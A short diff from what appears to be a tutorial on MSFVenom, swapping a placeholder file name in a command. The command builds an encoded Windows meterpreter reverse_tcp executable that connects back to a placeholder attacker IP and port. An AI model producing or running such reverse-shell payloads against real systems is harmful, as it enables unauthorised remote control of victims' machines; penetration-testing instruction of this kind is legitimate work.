@@ -11,7 +11,7 @@ MSFVenom is included as part of the metasploit framework install and can be used
 
 The following payload will create an obfuscated meterpreter executable (.exe) for an x86 32bit system:
 
-`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<Attacker_IP_Address> LPORT=<Attacker_Port> -f exe -o [SHELL NAME].exe`
+`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<Attacker_IP_Address> LPORT=<Attacker_Port> -f exe -o <payload_name>.exe`
 
 A breakdown of the command:
 
